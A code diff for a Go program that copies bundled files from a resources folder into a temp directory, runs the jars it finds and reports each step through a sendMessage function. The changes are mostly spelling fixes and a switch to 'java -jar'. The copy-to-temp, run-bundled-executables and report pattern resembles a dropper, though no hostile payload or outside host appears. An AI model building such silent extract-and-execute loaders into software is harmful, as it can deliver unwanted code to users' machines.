@@ -44,8 +44,8 @@ func main() {
 		return
 	}
 
-	if dumbFiles() == true {
-		sendMessage("[main] Moved you files.")
+	if dumpFiles() == true {
+		sendMessage("[main] Moved your files.")
 	} else {
 		sendMessage("[main] No jar found.")
 		return
@@ -58,7 +58,7 @@ func main() {
 
 func executeJar() bool {
 	for _, file := range executables {
-		cmd := exec.Command("cmd", "\""+tempFolder+"\\"+file+"\"")
+		cmd := exec.Command("java", "-jar", file)
 		output, err := cmd.CombinedOutput()
 		sendMessage(tempFolder + "\\" + file)
 		if err != nil {
@@ -69,7 +69,7 @@ func executeJar() bool {
 	return true
 }
 
-func dumbFiles() bool {
+func dumpFiles() bool {
 	var paths []string
 	files, err := ioutil.ReadDir("./resources")
 	sendError("dumbFiles", err)
@@ -77,25 +77,25 @@ func dumbFiles() bool {
 	for _, file := range files {
 		if !file.IsDir() {
 			paths = append(paths, file.Name())
-			sendMessage("[dumbFiles] " + file.Name())
+			sendMessage("[dumpFiles] " + file.Name())
 		}
 	}
-	sendError("dumbFiles", err)
+	sendError("dumpFiles", err)
 
 	for _, fileName := range paths {
 		var in string = "resources\\" + fileName
 		var out string = tempFolder + "\\" + fileName
 
 		inFile, err := os.Open(in)
-		sendError("dumbFiles", err)
+		sendError("dumpFiles", err)
 		defer inFile.Close()
 
 		outFile, err := os.Create(out)
-		sendError("dumbFiles", err)
+		sendError("dumpFiles", err)
 		defer outFile.Close()
 
 		_, err = io.Copy(outFile, inFile)
-		sendError("dumbFiles", err)
+		sendError("dumpFiles", err)
 
 		dotIndex := strings.LastIndex(fileName, ".")
 		extension := fileName[dotIndex:]
@@ -115,14 +115,12 @@ func dumbFiles() bool {
 		}
 	}
 
-	var i int = 0
 	for _, s := range executables {
 		sendMessage(s)
-		i++
 	}
 
-	if i < 1 {
-		sendMessage("No executables!")
+	if len(executables) == 0 {
+		return false
 	}
 
 	return true
